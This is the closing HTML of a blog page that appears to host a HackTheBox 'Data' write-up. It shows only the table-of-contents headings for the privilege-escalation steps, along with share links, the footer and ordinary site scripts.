SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.8.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudo-Privileges-Enumeration"><span class="toc-number">1.8.1.</span> <span class="toc-text">Sudo Privileges Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Identifying-the-Root-Filesystem"><span class="toc-number">1.8.2.</span> <span class="toc-text">Identifying the Root Filesystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finding-the-Docker-Container"><span class="toc-number">1.8.3.</span> <span class="toc-text">Finding the Docker Container</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gaining-Root-Shell-in-Docker"><span class="toc-number">1.8.4.</span> <span class="toc-text">Gaining Root Shell in Docker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mounting-the-Host-Filesystem"><span class="toc-number">1.8.5.</span> <span class="toc-text">Mounting the Host Filesystem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Capturing-the-Root-Flag"><span class="toc-number">1.8.6.</span> <span class="toc-text">Capturing the Root Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.9.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/10/22/HTB-Data/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&text=HTB-Data"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&is_video=false&description=HTB-Data"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Data&body=Check out this article: https://panosoikogr.github.io/2025/10/22/HTB-Data/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&title=HTB-Data"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/10/22/HTB-Data/&name=HTB-Data&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/10/22/HTB-Data/&t=HTB-Data"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
